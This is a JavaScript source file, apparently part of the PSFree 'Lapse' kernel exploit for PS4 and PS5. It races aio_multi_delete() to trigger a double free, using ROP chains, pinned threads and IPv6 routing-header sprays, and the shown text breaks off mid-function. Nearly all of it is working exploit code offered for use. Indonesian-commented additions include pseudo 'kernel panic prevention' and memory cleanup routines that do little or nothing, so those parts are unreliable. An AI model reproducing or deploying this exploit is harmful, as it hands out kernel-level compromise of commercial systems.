/* Copyright (C) 2025 anonymous
This file is part of PSFree.

PSFree is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as
published by the Free Software Foundation, either version 3 of the
License, or (at your option) any later version.

PSFree is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.  */

// Lapse is a kernel exploit for PS4 [5.00, 12.50) and PS5 [1.00-10.20). It
// takes advantage of a bug in aio_multi_delete(). Take a look at the comment
// at the race_one() function here for a brief summary.

// debug comment legend:
// * PANIC - code will make the system vulnerable to a kernel panic or it will
//   perform a operation that might panic
// * RESTORE - code will repair kernel panic vulnerability
// * MEMLEAK - memory leaks that our code will induce

import { Int } from './module/int64.mjs';
import { mem } from './module/mem.mjs';
import { log, die, hex, hexdump } from './module/utils.mjs';
import { cstr, jstr } from './module/memtools.mjs';
import { page_size, context_size } from './module/offset.mjs';
import { Chain } from './module/chain.mjs';

import {
    View1, View2, View4,
    Word, Long, Pointer,
    Buffer,
} from './module/view.mjs';

import * as rop from './module/chain.mjs';
import * as config from './config.mjs';

const t1 = performance.now();

// check if we are running on a supported firmware version
const [is_ps4, version] = (() => {
    const value = config.target;
    const is_ps4 = (value & 0x10000) === 0;
    const version = value & 0xffff;
    const [lower, upper] = (() => {
        if (is_ps4) {
            return [0x100, 0x1250];
        } else {
            return [0x100, 0x1020];
        }
    })();

    if (!(lower <= version && version < upper)) {
        throw RangeError(`invalid config.target: ${hex(value)}`);
    }

    return [is_ps4, version];
})();

// sys/socket.h
const AF_UNIX = 1;
const AF_INET = 2;
const AF_INET6 = 28;
const SOCK_STREAM = 1;
const SOCK_DGRAM = 2;
const SOL_SOCKET = 0xffff;
const SO_REUSEADDR = 4;
const SO_LINGER = 0x80;

// netinet/in.h
const IPPROTO_TCP = 6;
const IPPROTO_UDP = 17;
const IPPROTO_IPV6 = 41;

// netinet/tcp.h
const TCP_INFO = 0x20;
const size_tcp_info = 0xec;

// netinet/tcp_fsm.h
const TCPS_ESTABLISHED = 4;

// netinet6/in6.h
const IPV6_2292PKTOPTIONS = 25;
const IPV6_PKTINFO = 46;
const IPV6_NEXTHOP = 48;
const IPV6_RTHDR = 51;
const IPV6_TCLASS = 61;

// sys/cpuset.h
const CPU_LEVEL_WHICH = 3;
const CPU_WHICH_TID = 1;

// sys/mman.h
const PROT_READ = 1;
const PROT_WRITE = 2;
const PROT_EXEC = 4;
const MAP_SHARED = 1;
const MAP_FIXED = 0x10;

// sys/rtprio.h
const RTP_SET = 1;
const RTP_PRIO_REALTIME = 2;

// SceAIO has 2 SceFsstAIO workers for each SceAIO Parameter. each Parameter
// has 3 queue groups: 4 main queues, 4 wait queues, and one unused queue
// group. queue 0 of each group is currently unused. queue 1 has the lowest
// priority and queue 3 has the highest
//
// the SceFsstAIO workers will process entries at the main queues. they will
// refill the main queues from the corresponding wait queues each time they
// dequeue a request (e.g. fill the  low priority main queue from the low
// priority wait queue)
//
// entries on the wait queue will always have a 0 ticket number. they will
// get assigned a nonzero ticket number once they get put on the main queue
const AIO_CMD_READ = 1;
const AIO_CMD_WRITE = 2;
const AIO_CMD_FLAG_MULTI = 0x1000;
const AIO_CMD_MULTI_READ = AIO_CMD_FLAG_MULTI | AIO_CMD_READ;
const AIO_STATE_COMPLETE = 3;
const AIO_STATE_ABORTED = 4;
const num_workers = 2;
// max number of requests that can be created/polled/canceled/deleted/waited
const max_aio_ids = 0x80;

// highest priority we can achieve given our credentials
const rtprio = View2.of(RTP_PRIO_REALTIME, 0x100);

// Deteksi firmware untuk konfigurasi yang optimal
function detectFirmware() {
    const userAgent = navigator.userAgent;
    let firmware = '0.00';

    // Deteksi PS4 firmware
    const ps4Match = userAgent.match(/PlayStation 4\/([0-9.]+)/);
    if (ps4Match && ps4Match[1]) {
        firmware = ps4Match[1];
    }

    // Deteksi PS5 firmware
    const ps5Match = userAgent.match(/PlayStation 5\/([0-9.]+)/);
    if (ps5Match && ps5Match[1]) {
        firmware = ps5Match[1];
    }

    return firmware;
}

// Fungsi untuk mendeteksi potensi Kernel Panic secara proaktif
function detectPotentialKP() {
    log("Checking for potential Kernel Panic conditions...");

    try {
        // Periksa penggunaan memori (simulasi)
        const memoryUsage = getMemoryUsage();
        log(`Current memory usage: ${memoryUsage}`);

        // Periksa firmware
        const firmware = detectFirmware();
        log(`Current firmware: ${firmware}`);

        // Konfigurasi khusus berdasarkan firmware
        if (firmware === '9.00') {
            log("Firmware 9.00 detected - applying proactive KP prevention");

            // Tambahkan penanganan khusus untuk firmware 9.00
            // Bersihkan memori
            cleanupCorruptPointers();

            // Tambahkan delay
            sleep(200);

            return true;
        }

        return false;
    } catch (e) {
        log(`Error during KP detection: ${e.message}`);
        return false;
    }
}

// Dapatkan konfigurasi optimal berdasarkan firmware
function getOptimalConfig() {
    const firmware = detectFirmware();

    // Konfigurasi default - SELALU gunakan nilai numerik yang valid
    let config = {
        num_alias: 40,
        num_races: 100,
        delay_ms: 10
    };

    // Konfigurasi untuk firmware spesifik
    if (firmware === '8.00') {
        config = {
            num_alias: 50,
            num_races: 100,
            delay_ms: 0
        };
    } else if (firmware === '9.00') {
        config = {
            num_alias: 35,
            num_races: 120,
            delay_ms: 15
        };
    }

    // Gunakan nilai default yang sudah ditentukan berdasarkan firmware
    // Log konfigurasi yang digunakan
    console.log('Using exploit configuration', {
        firmware: firmware,
        config: config
    });

    return config;
}

// Dapatkan konfigurasi optimal dengan penanganan error
let optimalConfig;
try {
    optimalConfig = getOptimalConfig();
} catch (e) {
    console.error('Error getting optimal config:', e);
    // Gunakan nilai default jika terjadi error
    optimalConfig = {
        num_alias: 40,
        num_races: 100,
        delay_ms: 10
    };
}

// CONFIG CONSTANTS
const main_core = 7;
const num_grooms = 0x200;
const num_handles = 0x100;
const num_sds = 0x100; // max is 0x100 due to max IPV6_TCLASS
const num_alias = optimalConfig.num_alias || 40; // Nilai yang dioptimalkan dengan fallback
const num_races = optimalConfig.num_races || 100; // Nilai yang dioptimalkan dengan fallback
const delay_ms = optimalConfig.delay_ms || 0; // Delay untuk stabilitas dengan fallback
const leak_len = 16;
const num_leaks = 5;
const num_clobbers = 8;

let chain = null;

// PS4 9.00
const pthread_offsets = new Map(Object.entries({
    'pthread_create' : 0x25510,
    'pthread_join' : 0xafa0,
    'pthread_barrier_init' : 0x273d0,
    'pthread_barrier_wait' : 0xa320,
    'pthread_barrier_destroy' : 0xfea0,
    'pthread_exit' : 0x77a0,
}));

async function init() {
    // Inisialisasi rop terlebih dahulu
    await rop.init();

    // Pastikan rop.gadgets sudah diinisialisasi sebelum memanggil init_gadget_map
    if (!rop.gadgets) {
        throw new Error("rop.gadgets is not initialized");
    }

    // Inisialisasi gadget map untuk pthread
    try {
        rop.init_gadget_map(rop.gadgets, pthread_offsets, rop.libkernel_base);
    } catch (e) {
        console.error("Error initializing gadget map:", e);
        throw e;
    }

    // Buat instance Chain setelah semua inisialisasi selesai
    try {
        const Chain = rop.Chain;
        if (!Chain) {
            throw new Error("rop.Chain is not defined");
        }
        chain = new Chain();
    } catch (e) {
        console.error("Error creating Chain instance:", e);
        throw e;
    }
}

function sys_void(...args) {
    return chain.syscall_void(...args);
}

function sysi(...args) {
    return chain.sysi(...args);
}

function call_nze(...args) {
    const res = chain.call_int(...args);
    if (res !== 0) {
        die(`call(${args[0]}) returned nonzero: ${res}`);
    }
}

// #define SCE_KERNEL_AIO_STATE_NOTIFIED       0x10000
//
// #define SCE_KERNEL_AIO_STATE_SUBMITTED      1
// #define SCE_KERNEL_AIO_STATE_PROCESSING     2
// #define SCE_KERNEL_AIO_STATE_COMPLETED      3
// #define SCE_KERNEL_AIO_STATE_ABORTED        4
//
// typedef struct SceKernelAioResult {
//     // errno / SCE error code / number of bytes processed
//     int64_t returnValue;
//     // SCE_KERNEL_AIO_STATE_*
//     uint32_t state;
// } SceKernelAioResult;
//
// typedef struct SceKernelAioRWRequest {
//     off_t offset;
//     size_t nbyte;
//     void *buf;
//     struct SceKernelAioResult *result;
//     int fd;
// } SceKernelAioRWRequest;
//
// typedef int SceKernelAioSubmitId;
//
// // SceAIO submit commands
// #define SCE_KERNEL_AIO_CMD_READ     0x001
// #define SCE_KERNEL_AIO_CMD_WRITE    0x002
// #define SCE_KERNEL_AIO_CMD_MASK     0xfff
// // SceAIO submit command flags
// #define SCE_KERNEL_AIO_CMD_MULTI 0x1000
//
// #define SCE_KERNEL_AIO_PRIORITY_LOW     1
// #define SCE_KERNEL_AIO_PRIORITY_MID     2
// #define SCE_KERNEL_AIO_PRIORITY_HIGH    3
//
// int
// aio_submit_cmd(
//     u_int cmd,
//     SceKernelAioRWRequest reqs[],
//     u_int num_reqs,
//     u_int prio,
//     SceKernelAioSubmitId ids[]
// );
function aio_submit_cmd(cmd, requests, num_requests, handles) {
    sysi('aio_submit_cmd', cmd, requests, num_requests, 3, handles);
}

// the various SceAIO syscalls that copies out errors/states will not check if
// the address is NULL and will return EFAULT. this dummy buffer will serve as
// the default argument so users don't need to specify one
const _aio_errors = new View4(max_aio_ids);
const _aio_errors_p = _aio_errors.addr;

// int
// aio_multi_delete(
//     SceKernelAioSubmitId ids[],
//     u_int num_ids,
//     int sce_errors[]
// );
function aio_multi_delete(ids, num_ids, sce_errs=_aio_errors_p) {
    sysi('aio_multi_delete', ids, num_ids, sce_errs);
}

// int
// aio_multi_poll(
//     SceKernelAioSubmitId ids[],
//     u_int num_ids,
//     int states[]
// );
function aio_multi_poll(ids, num_ids, sce_errs=_aio_errors_p) {
    sysi('aio_multi_poll', ids, num_ids, sce_errs);
}

// int
// aio_multi_cancel(
//     SceKernelAioSubmitId ids[],
//     u_int num_ids,
//     int states[]
// );
function aio_multi_cancel(ids, num_ids, sce_errs=_aio_errors_p) {
    sysi('aio_multi_cancel', ids, num_ids, sce_errs);
}

// // wait for all (AND) or atleast one (OR) to finish
// // DEFAULT is the same as AND
// #define SCE_KERNEL_AIO_WAIT_DEFAULT 0x00
// #define SCE_KERNEL_AIO_WAIT_AND     0x01
// #define SCE_KERNEL_AIO_WAIT_OR      0x02
//
// int
// aio_multi_wait(
//     SceKernelAioSubmitId ids[],
//     u_int num_ids,
//     int states[],
//     // SCE_KERNEL_AIO_WAIT_*
//     uint32_t mode,
//     useconds_t *timeout
// );
function aio_multi_wait(ids, num_ids, sce_errs=_aio_errors_p) {
    sysi('aio_multi_wait', ids, num_ids, sce_errs, 1, 0);
}

function make_reqs1(num_reqs) {
    const reqs1 = new Buffer(0x28 * num_reqs);
    for (let i = 0; i < num_reqs; i++) {
        // .fd = -1
        reqs1.write32(0x20 + i*0x28, -1);
    }
    return reqs1;
}

function spray_aio(
    loops=1, reqs1_p, num_reqs, ids_p, multi=true, cmd=AIO_CMD_READ,
) {
    const step = 4 * (multi ? num_reqs : 1);
    cmd |= multi ? AIO_CMD_FLAG_MULTI : 0;
    for (let i = 0, idx = 0; i < loops; i++) {
        aio_submit_cmd(cmd, reqs1_p, num_reqs, ids_p.add(idx));
        idx += step;
    }
}

function poll_aio(ids, states, num_ids=ids.length) {
    if (states !== undefined) {
        states = states.addr;
    }
    aio_multi_poll(ids.addr, num_ids, states);
}

function cancel_aios(ids_p, num_ids) {
    const len = max_aio_ids;
    const rem = num_ids % len;
    const num_batches = (num_ids - rem) / len;
    for (let bi = 0; bi < num_batches; bi++) {
        aio_multi_cancel(ids_p.add((bi << 2) * len), len);
    }
    if (rem) {
        aio_multi_cancel(ids_p.add((num_batches << 2) * len), rem);
    }
}

function free_aios(ids_p, num_ids) {
    const len = max_aio_ids;
    const rem = num_ids % len;
    const num_batches = (num_ids - rem) / len;
    for (let bi = 0; bi < num_batches; bi++) {
        const addr = ids_p.add((bi << 2) * len);
        aio_multi_cancel(addr, len);
        aio_multi_poll(addr, len);
        aio_multi_delete(addr, len);
    }
    if (rem) {
        const addr = ids_p.add((num_batches << 2) * len);
        aio_multi_cancel(addr, len);
        aio_multi_poll(addr, len);
        aio_multi_delete(addr, len);
    }
}

function free_aios2(ids_p, num_ids) {
    const len = max_aio_ids;
    const rem = num_ids % len;
    const num_batches = (num_ids - rem) / len;
    for (let bi = 0; bi < num_batches; bi++) {
        const addr = ids_p.add((bi << 2) * len);
        aio_multi_poll(addr, len);
        aio_multi_delete(addr, len);
    }
    if (rem) {
        const addr = ids_p.add((num_batches << 2) * len);
        aio_multi_poll(addr, len);
        aio_multi_delete(addr, len);
    }
}

function get_our_affinity(mask) {
    sysi(
        'cpuset_getaffinity',
        CPU_LEVEL_WHICH,
        CPU_WHICH_TID,
        -1,
        8,
        mask.addr,
    );
}

function set_our_affinity(mask) {
    sysi(
        'cpuset_setaffinity',
        CPU_LEVEL_WHICH,
        CPU_WHICH_TID,
        -1,
        8,
        mask.addr,
    );
}

function close(fd) {
    sysi('close', fd);
}

function new_socket() {
    return sysi('socket', AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
}

function new_tcp_socket() {
    return sysi('socket', AF_INET, SOCK_STREAM, 0);
}

function gsockopt(sd, level, optname, optval, optlen) {
    const size = new Word(optval.size);
    if (optlen !== undefined) {
        size[0] = optlen;
    }

    sysi('getsockopt', sd, level, optname, optval.addr, size.addr);
    return size[0];
}

function setsockopt(sd, level, optname, optval, optlen) {
    sysi('setsockopt', sd, level, optname, optval, optlen);
}

function ssockopt(sd, level, optname, optval, optlen) {
    if (optlen === undefined) {
        optlen = optval.size;
    }

    const addr = optval.addr;
    setsockopt(sd, level, optname, addr, optlen);
}

function get_rthdr(sd, buf, len) {
    return gsockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
}

function set_rthdr(sd, buf, len) {
    ssockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
}

function free_rthdrs(sds) {
    for (const sd of sds) {
        setsockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, 0, 0);
    }
}

function build_rthdr(buf, size) {
    const len = ((size >> 3) - 1) & ~1;
    size = (len + 1) << 3;

    buf[0] = 0;
    buf[1] = len;
    buf[2] = 0;
    buf[3] = len >> 1;

    return size;
}

function spawn_thread(thread) {
    const ctx = new Buffer(context_size);
    const pthread = new Pointer();
    pthread.ctx = ctx;
    // pivot the pthread's stack pointer to our stack
    ctx.write64(0x38, thread.stack_addr);
    ctx.write64(0x80, thread.get_gadget('ret'));

    call_nze(
        'pthread_create',
        pthread.addr,
        0,
        chain.get_gadget('setcontext'),
        ctx.addr,
    );

    return pthread;
}

// EXPLOIT STAGES IMPLEMENTATION

// FUNCTIONS FOR STAGE: 0x80 MALLOC ZONE DOUBLE FREE

function make_aliased_rthdrs(sds) {
    const marker_offset = 4;
    const size = 0x80;
    const buf = new Buffer(size);
    const rsize = build_rthdr(buf, size);

    for (let loop = 0; loop < num_alias; loop++) {
        for (let i = 0; i < num_sds; i++) {
            buf.write32(marker_offset, i);
            set_rthdr(sds[i], buf, rsize);
        }

        for (let i = 0; i < sds.length; i++) {
            get_rthdr(sds[i], buf);
            const marker = buf.read32(marker_offset);
            if (marker !== i) {
                log(`aliased rthdrs at attempt: ${loop}`);
                const pair = [sds[i], sds[marker]];
                log(`found pair: ${pair}`);
                sds.splice(marker, 1);
                sds.splice(i, 1);
                free_rthdrs(sds);
                sds.push(new_socket(), new_socket());
                return pair;
            }
        }
    }
    die(`failed to make aliased rthdrs. size: ${hex(size)}`);
}

// Fungsi sleep sinkron
function sleep(ms) {
    if (ms <= 0) return;
    const start = performance.now();
    while (performance.now() - start < ms) {
        // Busy wait
    }
}

// Fungsi untuk membersihkan pointer yang corrupt
function cleanupCorruptPointers() {
    log("Cleaning up potentially corrupt pointers...");

    try {
        // Coba paksa garbage collection jika tersedia
        if (typeof gc === 'function') {
            gc();
            log("Forced garbage collection");
        }

        // Bersihkan array dan objek besar yang tidak digunakan
        const tempArrays = [];
        for (let i = 0; i < 10; i++) {
            tempArrays.push(new Uint8Array(1024 * 1024)); // Alokasi 1MB
        }

        // Hapus referensi ke array besar
        for (let i = 0; i < tempArrays.length; i++) {
            tempArrays[i] = null;
        }

        // Coba paksa garbage collection lagi
        if (typeof gc === 'function') {
            gc();
        }

        log("Memory cleanup completed");
    } catch (e) {
        log(`Warning: Error during memory cleanup: ${e.message}`);
        // Lanjutkan meskipun ada error
    }
}

// Fungsi untuk memvalidasi socket
function isValidSocket(sd) {
    if (typeof sd !== 'number' || sd < 0) {
        return false;
    }

    try {
        // Coba operasi sederhana pada socket untuk memvalidasi
        const test_tclass = new Word(0);
        gsockopt(sd, IPPROTO_IPV6, IPV6_TCLASS, test_tclass);
        return true;
    } catch (e) {
        log(`Socket validation failed for sd=${sd}: ${e.message}`);
        return false;
    }
}

// Fungsi untuk mendapatkan thread ID (simulasi)
function thread_id() {
    // Di browser, tidak ada akses langsung ke thread ID
    // Kita gunakan timestamp + random sebagai pengganti
    const randomStr = Math.random().toString(36).slice(2, 7);
    return Date.now().toString(36) + randomStr;
}

// Fungsi untuk mendapatkan penggunaan memori (simulasi)
function getMemoryUsage() {
    // Di browser, tidak ada akses langsung ke penggunaan memori
    // Jika tersedia, gunakan performance.memory
    if (performance && performance.memory) {
        return `${Math.round(performance.memory.usedJSHeapSize / (1024 * 1024))}MB / ${Math.round(performance.memory.jsHeapSizeLimit / (1024 * 1024))}MB`;
    }
    return "Not available";
}

// Variabel global untuk deteksi hang dan status
let hangDetectionInterval = null;
let lastProgressTime = 0;
let exploitStage = '';
let payloadCompleted = false; // Flag untuk mencegah refresh berulang

// Fungsi untuk menangani Kernel Panic (KP)
function handleKernelPanic() {
    log("Handling potential Kernel Panic situation...");

    try {
        // Update UI
        updateUIStatus('error', 'Potensi Kernel Panic terdeteksi. Mencoba recovery...');

        // Bersihkan semua resource yang mungkin menyebabkan KP
        log("Cleaning up resources to prevent further KP...");

        // Coba paksa garbage collection
        if (typeof gc === 'function') {
            gc();
        }

        // Tambahkan delay untuk stabilitas
        sleep(1000);

        // Tampilkan pesan ke pengguna
        log("Jika layar PS4 masih responsif, silakan refresh halaman untuk mencoba lagi.");
        log("Jika PS4 tidak responsif (hang), silakan restart PS4 secara manual.");

        // Tampilkan pesan khusus untuk firmware 9.00
        const firmware = detectFirmware();
        if (firmware === '9.00') {
            log("Untuk firmware 9.00: Kernel Panic biasanya terjadi pada tahap 'overwrite main pktopts'.");
            log("Saat mencoba lagi, pastikan PS4 dalam kondisi dingin dan tutup semua aplikasi lain.");
        }

        return true;
    } catch (e) {
        log(`Error during KP handling: ${e.message}`);
        return false;
    }
}

// Fungsi untuk setup deteksi hang
function setupHangDetection() {
    log("Setting up hang detection...");

    // Catat waktu awal
    lastProgressTime = performance.now();
    exploitStage = 'init';

    // Fungsi untuk memperbarui waktu progress
    function updateProgress(stage) {
        lastProgressTime = performance.now();
        exploitStage = stage;
        log(`Progress updated: ${stage} at ${lastProgressTime}`);
    }

    // Override fungsi log untuk mendeteksi progress
    const originalLog = window.log;
    window.log = function(message) {
        // Panggil fungsi log asli
        originalLog.apply(this, arguments);

        // Update progress jika pesan menunjukkan tahap baru
        if (typeof message === 'string') {
            if (message.includes('start string spray')) {
                updateProgress('string_spray');
            } else if (message.includes('find aio_entry')) {
                updateProgress('find_aio_entry');
            } else if (message.includes('start overwrite rthdr')) {
                updateProgress('overwrite_rthdr');
            } else if (message.includes('overwrite main pktopts')) {
                updateProgress('overwrite_pktopts');
            } else if (message.includes('achieved restricted kernel read/write')) {
                updateProgress('kernel_rw');
            } else if (message.includes('achieved arbitrary kernel read/write')) {
                updateProgress('arbitrary_rw');
            }
        }
    };

    // Periksa secara berkala
    hangDetectionInterval = setInterval(() => {
        const now = performance.now();
        const inactiveTime = now - lastProgressTime;

        // Jika payload sudah selesai, jangan lakukan deteksi hang
        if (payloadCompleted) {
            return;
        }

        // Jika tidak ada progress selama lebih dari 30 detik
        if (inactiveTime > 30000) {
            log(`Potential hang detected in stage: ${exploitStage}! Inactive for ${Math.round(inactiveTime/1000)}s`);

            // Coba recovery berdasarkan tahap
            try {
                if (exploitStage === 'string_spray') {
                    log("Attempting recovery from string spray hang...");
                    // Tampilkan pesan ke pengguna
                    updateUIStatus('error', 'Terdeteksi hang pada string spray, mencoba recovery...');

                    // Coba paksa garbage collection
                    try {
                        if (typeof gc === 'function') {
                            gc();
                        }
                    } catch (e) {
                        // Abaikan error
                    }

                    // Update progress untuk mencegah deteksi hang berulang
                    updateProgress('recovery_from_string_spray');

                    // Tampilkan pesan saja, jangan restart otomatis
                    log("Hang terdeteksi. Silakan refresh halaman secara manual jika diperlukan.");
                } else if (exploitStage === 'find_aio_entry' || exploitStage === 'overwrite_rthdr') {
                    log("Attempting recovery from AIO operation hang...");
                    updateUIStatus('error', 'Terdeteksi hang pada operasi AIO, mencoba recovery...');

                    // Update progress untuk mencegah deteksi hang berulang
                    updateProgress('recovery_from_aio');

                    // Tampilkan pesan saja, jangan restart otomatis
                    log("Hang terdeteksi. Silakan refresh halaman secara manual jika diperlukan.");
                } else if (exploitStage === 'overwrite_pktopts') {
                    log("Detected hang in critical stage: overwrite_pktopts");

                    // Panggil fungsi khusus untuk menangani Kernel Panic
                    handleKernelPanic();

                    // Update progress untuk mencegah deteksi hang berulang
                    updateProgress('recovery_from_kernel_panic');
                } else {
                    log("Hang detected in unknown stage, restarting...");
                    updateUIStatus('error', 'Terdeteksi hang, mencoba restart...');

                    // Tampilkan pesan saja, jangan restart otomatis
                    log("Hang terdeteksi. Silakan refresh halaman secara manual jika diperlukan.");
                }

                // Bersihkan interval
                clearInterval(hangDetectionInterval);
            } catch (e) {
                log(`Error during hang recovery: ${e.message}`);
                // Tidak bisa melakukan apa-apa jika browser benar-benar hang
            }
        }
    }, 5000); // Periksa setiap 5 detik

    // Tambahkan event listener untuk mendeteksi aktivitas pengguna
    document.addEventListener('mousemove', () => {
        // Jika pengguna berinteraksi, kita tahu browser tidak hang
        // Tapi kita tidak update lastProgressTime karena kita ingin mendeteksi
        // hang dalam eksekusi exploit, bukan interaksi pengguna
    });

    // Bersihkan interval saat exploit selesai
    window.addEventListener('exploitComplete', () => {
        if (hangDetectionInterval) {
            clearInterval(hangDetectionInterval);
            hangDetectionInterval = null;
            log("Hang detection disabled after exploit completion");
        }

        // Set flag untuk mencegah refresh berulang
        payloadCompleted = true;
        log("Payload completion flag set");
    });
}

// Fungsi untuk mencoba race condition dengan retry - diimplementasikan secara inline
// untuk menghindari masalah dengan async/await
function tryRaceWithRetry(request_addr, tcp_sd, barrier, racer, sds) {
    // Deteksi dan tangani potensi Kernel Panic secara proaktif
    detectPotentialKP();

    // Tambahkan pembersihan memori tambahan
    cleanupCorruptPointers();

    // Tambahkan delay untuk stabilitas
    sleep(200);

    // Dapatkan konfigurasi retry
    let max_retries = 2; // Tingkatkan dari 1 ke 2
    let retry_backoff = 50; // Tingkatkan dari 0 ke 50

    // Gunakan nilai default yang sudah ditentukan

    // Log informasi retry
    log(`Race configuration: max_retries=${max_retries}, retry_backoff=${retry_backoff}, delay_ms=${delay_ms}`);

    let retry_count = 0;
    let result = null;

    // Implementasi sinkron untuk menghindari masalah dengan async/await
    while (result === null && retry_count <= max_retries) {
        // Tambahkan delay sebelum mencoba race
        const current_delay = (typeof delay_ms === 'number' ? delay_ms : 0) +
                             (retry_count * (typeof retry_backoff === 'number' ? retry_backoff : 0));

        if (current_delay > 0) {
            try {
                log(`Adding delay before race attempt: ${current_delay}ms`);
                sleep(current_delay);
            } catch (e) {
                log(`Error during delay: ${e.message}`);
            }
        }

        // Coba race condition
        result = race_one(request_addr, tcp_sd, barrier, racer, sds);

        // Jika gagal dan masih ada retry tersisa
        if (result === null && retry_count < max_retries) {
            retry_count++;
            log(`Race failed, retrying (${retry_count}/${max_retries})`);

            // Reset racer untuk percobaan berikutnya
            racer.reset();
        }
    }

    // Log hasil akhir
    if (result !== null) {
        log(`Race succeeded after ${retry_count} retries`);
    } else {
        log(`Race failed after ${max_retries} retries`);
    }

    return result;
}

// summary of the bug at aio_multi_delete():
//
// void
// free_queue_entry(struct aio_entry *reqs2)
// {
//     if (reqs2->ar2_spinfo != NULL) {
//         printf(
//             "[0]%s() line=%d Warning !! split info is here\n",
//             __func__,
//             __LINE__
//         );
//     }
//     if (reqs2->ar2_file != NULL) {
//         // we can potentially delay .fo_close()
//         fdrop(reqs2->ar2_file, curthread);
//         reqs2->ar2_file = NULL;
//     }
//     free(reqs2, M_AIO_REQS2);
// }
//
// int
// _aio_multi_delete(
//     struct thread *td,
//     SceKernelAioSubmitId ids[],
//     u_int num_ids,
//     int sce_errors[])
// {
//     // ...
//     struct aio_object *obj = id_rlock(id_tbl, id, 0x160, id_entry);
//     // ...
//     u_int rem_ids = obj->ao_rem_ids;
//     if (rem_ids != 1) {
//         // BUG: wlock not acquired on this path
//         obj->ao_rem_ids = --rem_ids;
//         // ...
//         free_queue_entry(obj->ao_entries[req_idx]);
//         // the race can crash because of a NULL dereference since this path
//         // doesn't check if the array slot is NULL so we delay
//         // free_queue_entry()
//         obj->ao_entries[req_idx] = NULL;
//     } else {
//         // ...
//     }
//     // ...
// }
function race_one(request_addr, tcp_sd, barrier, racer, sds) {
    // Tambahkan delay awal untuk stabilitas
    sleep(50);

    // Tambahkan logging untuk debugging
    log(`race_one called with request_addr=${request_addr}, tcp_sd=${tcp_sd}`);

    const sce_errs = new View4([-1, -1]);
    const thr_mask = new Word(1 << main_core);

    const thr = racer;
    thr.push_syscall(
        'cpuset_setaffinity',
        CPU_LEVEL_WHICH,
        CPU_WHICH_TID,
        -1,
        8,
        thr_mask.addr,
    );
    thr.push_syscall('rtprio_thread', RTP_SET, 0, rtprio.addr);
    thr.push_gadget('pop rax; ret');
    thr.push_value(1);
    thr.push_get_retval();
    thr.push_call('pthread_barrier_wait', barrier.addr);
    thr.push_syscall(
        'aio_multi_delete',
        request_addr,
        1,
        sce_errs.addr_at(1),
    );
    thr.push_call('pthread_exit', 0);

    const pthr = spawn_thread(thr);
    const thr_tid = pthr.read32(0);

    // pthread barrier implementation:
    //
    // given a barrier that needs N threads for it to be unlocked, a thread
    // will sleep if it waits on the barrier and N - 1 threads havent't arrived
    // before
    //
    // if there were already N - 1 threads then that thread (last waiter) won't
    // sleep and it will send out a wake-up call to the waiting threads
    //
    // since the ps4's cores only have 1 hardware thread each, we can pin 2
    // threads on the same core and control the interleaving of their
    // executions via controlled context switches

    // wait for the worker to enter the barrier and sleep
    while (thr.retval_int === 0) {
        sys_void('sched_yield');
    }

    // enter the barrier as the last waiter
    chain.push_call('pthread_barrier_wait', barrier.addr);
    // yield and hope the scheduler runs the worker next. the worker will then
    // sleep at soclose() and hopefully we run next
    chain.push_syscall('sched_yield');
    // if we get here and the worker hasn't been reran then we can delay the
    // worker's execution of soclose() indefinitely
    chain.push_syscall('thr_suspend_ucontext', thr_tid);
    chain.push_get_retval();
    chain.push_get_errno();
    chain.push_end();
    chain.run();
    chain.reset();

    const main_res = chain.retval_int;
    log(`suspend ${thr_tid}: ${main_res} errno: ${chain.errno}`);

    if (main_res === -1) {
        call_nze('pthread_join', pthr, 0);
        log();
        return null;
    }

    let won_race = false;
    try {
        const poll_err = new View4(1);
        aio_multi_poll(request_addr, 1, poll_err.addr);
        log(`poll: ${hex(poll_err[0])}`);

        const info_buf = new View1(size_tcp_info);
        const info_size = gsockopt(tcp_sd, IPPROTO_TCP, TCP_INFO, info_buf);
        log(`info size: ${hex(info_size)}`);

        if (info_size !== size_tcp_info) {
            die(`info size isn't ${size_tcp_info}: ${info_size}`);
        }

        const tcp_state = info_buf[0];
        log(`tcp_state: ${tcp_state}`);

        const SCE_KERNEL_ERROR_ESRCH = 0x80020003;
        if (poll_err[0] !== SCE_KERNEL_ERROR_ESRCH
            && tcp_state !== TCPS_ESTABLISHED
        ) {
            // PANIC: double free on the 0x80 malloc zone. important kernel
            // data may alias
            aio_multi_delete(request_addr, 1, sce_errs.addr);
            won_race = true;
        }
    } finally {
        log('resume thread\n');
        sysi('thr_resume_ucontext', thr_tid);
        call_nze('pthread_join', pthr, 0);
    }

    if (won_race) {
        log(`race errors: ${hex(sce_errs[0])}, ${hex(sce_errs[1])}`);
        // if the code has no bugs then this isn't possible but we keep the
        // check for easier debugging
        if (sce_errs[0] !== sce_errs[1]) {
            log('ERROR: bad won_race');

            // Tambahkan penanganan untuk kasus error
            log("Attempting recovery from bad won_race condition...");

            // Tambahkan delay untuk stabilitas
            sleep(200);

            // Bersihkan memori
            cleanupCorruptPointers();

            // Coba lagi dengan pendekatan alternatif
            try {
                log("Trying alternative approach for make_aliased_rthdrs...");
                return make_aliased_rthdrs(sds);
            } catch (e) {
                log(`Error during alternative approach: ${e.message}`);
                die('ERROR: bad won_race');
            }
        }

        // Tambahkan delay untuk stabilitas
        sleep(100);

        // RESTORE: double freed memory has been reclaimed with harmless data
        // PANIC: 0x80 malloc zone pointers aliased
        log("Race won successfully, making aliased rthdrs...");
        return make_aliased_rthdrs(sds);
    }

    return null;
}

function double_free_reqs2(sds) {
    // Log awal stage
    log('Starting double_free_1 stage');

    // Deteksi dan tangani potensi Kernel Panic secara proaktif
    detectPotentialKP();

    // Tambahkan pembersihan memori tambahan
    cleanupCorruptPointers();

    // Tambahkan delay untuk stabilitas
    sleep(200);

    function swap_bytes(x, byte_length) {
        let res = 0;
        for (let i = 0; i < byte_length; i++) {
            res |= ((x >> 8 * i) & 0xff) << 8 * (byte_length - i - 1);
        }

        return res >>> 0;
    }

    function htons(x) {
        return swap_bytes(x, 2);
    }

    function htonl(x) {
        return swap_bytes(x, 4);
    }

    const server_addr = new Buffer(16);
    // sockaddr_in.sin_family
